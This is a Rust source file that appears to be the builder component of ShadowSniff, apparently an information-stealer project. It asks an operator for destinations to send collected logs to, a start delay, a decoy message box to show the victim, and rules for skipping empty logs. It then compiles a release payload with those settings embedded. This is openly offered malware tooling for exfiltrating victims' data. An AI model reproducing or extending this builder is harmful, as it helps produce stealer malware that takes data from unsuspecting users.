/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#![feature(tuple_trait)]

use crate::empty_log::ConsiderEmpty;
use crate::message_box::{MessageBox, Show};
use crate::send_settings::SendSettings;
use crate::start_delay::StartDelay;
use colored::Colorize;
use inquire::InquireError;
use proc_macro2::TokenStream;
use quote::quote;
use serde::{Deserialize, Serialize};
use std::fmt::Display;
use std::fs;
use std::io::Write;
use std::marker::Tuple;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use tempfile::NamedTempFile;

mod empty_log;
mod message_box;
mod send_settings;
mod sender_service;
mod start_delay;

pub trait ToExpr<Args: Tuple = ()> {
    fn to_expr(&self, args: Args) -> TokenStream;
}

pub trait ToExprExt<Args: Tuple = ()>: ToExpr<Args> {
    fn to_expr_temp_file(&self, args: Args) -> PathBuf;
}

impl<T: ToExpr<Args>, Args: Tuple> ToExprExt<Args> for T {
    fn to_expr_temp_file(&self, args: Args) -> PathBuf {
        let mut expr_file: NamedTempFile = NamedTempFile::new().unwrap();
        expr_file.disable_cleanup(true);

        write!(expr_file, "{}", self.to_expr(args)).unwrap();

        fs::canonicalize(expr_file.path()).unwrap()
    }
}

pub trait Ask {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized;
}

pub trait AskInstanceFactory: Display {
    type Output;

    fn ask_instance(&self) -> Result<Self::Output, InquireError>;
}

#[derive(Serialize, Deserialize)]
pub struct BuilderConfig {
    send_settings: Vec<SendSettings>,
    consider_empty: Vec<ConsiderEmpty>,
    start_delay: StartDelay,
    message_box: Option<MessageBox>,
}

impl Ask for BuilderConfig {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized,
    {
        let send_settings = Vec::<SendSettings>::ask()?;
        println!();
        let start_delay = StartDelay::ask()?;
        println!();
        let message_box = Option::<MessageBox>::ask()?;
        println!();
        let consider_empty = Vec::<ConsiderEmpty>::ask()?;

        Ok(Self {
            send_settings,
            consider_empty,
            start_delay,
            message_box,
        })
    }
}

impl BuilderConfig {
    pub fn build(self) {
        if self.send_settings.is_empty() {
            println!(
                "{}",
                "[!] No log destination specified. At least one log destination is required.".red()
            );

            return;
        }

        println!("\nStarting build...");

        let mut builder = &mut Command::new("cargo");

        builder = builder
            .arg("build")
            .env("RUSTFLAGS", "-Awarnings")
            .arg("--release")
            .arg("--features")
            .arg("builder_build")
            .env(
                "BUILDER_SENDER_EXPR",
                self.send_settings
                    .to_expr_temp_file((
                        quote! {_log_name.clone()},
                        quote! {&_zip},
                        quote! {&collector},
                    ))
                    .display()
                    .to_string(),
            )
            .env(
                "BUILDER_CONSIDER_EMPTY_EXPR",
                self.consider_empty
                    .to_expr_temp_file((quote! {collector}, quote! {return;}))
                    .display()
                    .to_string(),
            )
            .env(
                "BUILDER_START_DELAY",
                self.start_delay.to_expr_temp_file(()).display().to_string(),
            )
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit());

        if let Some(message_box) = self.message_box {
            builder = builder.arg("--features");

            builder = match message_box.show {
                Show::Before => builder.arg("message_box_before_execution"),
                Show::After => builder.arg("message_box_after_execution"),
            };

            builder = builder.env(
                "BUILDER_MESSAGE_BOX_EXPR",
                message_box.to_expr_temp_file(()).display().to_string(),
            )
        }

        let _ = builder.status().expect("Failed to start cargo build");
    }
}
